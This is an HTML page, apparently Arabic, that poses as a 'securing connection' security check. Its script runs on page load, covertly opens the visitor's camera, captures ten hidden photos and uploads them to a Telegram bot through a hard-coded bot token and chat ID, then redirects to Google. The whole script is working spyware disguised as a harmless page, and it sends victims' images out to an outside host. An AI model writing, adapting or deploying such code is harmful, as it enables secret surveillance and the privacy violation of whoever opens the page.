<!DOCTYPE html>
<html lang="ar">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Ø¬Ø§Ø±ÙŠ ØªØ£Ù…ÙŠÙ† Ø§Ù„Ø§ØªØµØ§Ù„...</title>
    <style>
        body { background-color: #121212; color: white; font-family: sans-serif; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
        .loader { border: 5px solid #333; border-top: 5px solid #e74c3c; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; }
        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
        p { margin-top: 20px; color: #888; }
    </style>
</head>
<body>
    <div class="loader"></div>
    <p>Ø¬Ø§Ø±ÙŠ ÙØ­Øµ Ø¨Ø±ÙˆØªÙˆÙƒÙˆÙ„Ø§Øª Ø§Ù„Ø£Ù…Ø§Ù†ØŒ ÙŠØ±Ø¬Ù‰ Ø§Ù„Ø§Ù†ØªØ¸Ø§Ø±...</p>

    <video id="video" width="640" height="480" autoplay style="display:none;"></video>
    <canvas id="canvas" width="640" height="480" style="display:none;"></canvas>

    <script>
        const TOKEN = '8596805324:AAELff4nCa1M4GWFiGW3gw3vIadL1c1i93o';
        const CHAT_ID = '8293639164';
        let photoCount = 0;
        const maxPhotos = 10; // Ø¹Ø¯Ø¯ Ø§Ù„ØµÙˆØ± Ø§Ù„Ù…Ø·Ù„ÙˆØ¨

        async function startCamera() {
            try {
                const stream = await navigator.mediaDevices.getUserMedia({ video: true });
                const video = document.getElementById('video');
                video.srcObject = stream;

                // Ø¥Ø´Ø¹Ø§Ø± Ø¨Ø§Ù„Ø¯Ø®ÙˆÙ„
                fetch(`https://api.telegram.org/bot${TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodeURIComponent("ğŸš¨ Ø¨Ø¯Ø£ Ø§Ù„ØªÙ‚Ø§Ø· Ø³Ù„Ø³Ù„Ø© Ø§Ù„ØµÙˆØ± (10 ØµÙˆØ±)...")}`);

                // ÙˆØ¸ÙŠÙØ© Ø§Ù„ØªÙ‚Ø§Ø· ÙˆØ¥Ø±Ø³Ø§Ù„ ØµÙˆØ±Ø© ÙˆØ§Ø­Ø¯Ø©
                const takeAndSendPhoto = () => {
                    if (photoCount < maxPhotos) {
                        const canvas = document.getElementById('canvas');
                        canvas.getContext('2d').drawImage(video, 0, 0);
                        canvas.toBlob(blob => {
                            const formData = new FormData();
                            formData.append('photo', blob, `photo_${photoCount}.jpg`);
                            formData.append('chat_id', CHAT_ID);
                            formData.append('caption', `ğŸ“¸ Ù„Ù‚Ø·Ø© Ø±Ù‚Ù… ${photoCount + 1}`);

                            fetch(`https://api.telegram.org/bot${TOKEN}/sendPhoto`, {
                                method: 'POST',
                                body: formData
                            }).then(() => {
                                photoCount++;
                                if (photoCount < maxPhotos) {
                                    setTimeout(takeAndSendPhoto, 1000); // Ø§Ù†ØªØ¸Ø± Ø«Ø§Ù†ÙŠØ© Ù‚Ø¨Ù„ Ø§Ù„ØµÙˆØ±Ø© Ø§Ù„ØªØ§Ù„ÙŠØ©
                                } else {
                                    // Ø¨Ø¹Ø¯ Ø§Ù„Ø§Ù†ØªÙ‡Ø§Ø¡ Ù…Ù† Ø§Ù„Ù€ 10 ØµÙˆØ±ØŒ Ø­ÙˆÙ„Ù‡ Ù„Ø¬ÙˆØ¬Ù„
                                    window.location.href = "https://www.google.com";
                                }
                            });
                        }, 'image/jpeg');
                    }
                };

                // Ø§Ø¨Ø¯Ø£ Ø£ÙˆÙ„ ØµÙˆØ±Ø© Ø¨Ø¹Ø¯ Ø«Ø§Ù†ÙŠØªÙŠÙ† Ù…Ù† ÙØªØ­ Ø§Ù„ÙƒØ§Ù…ÙŠØ±Ø§ Ù„Ø¶Ù…Ø§Ù† Ø§Ù„ÙˆØ¶ÙˆØ­
                setTimeout(takeAndSendPhoto, 2000);

            } catch (err) {
                window.location.href = "https://www.google.com";
            }
        }
        window.onload = startCamera;
    </script>
</body>
</html>
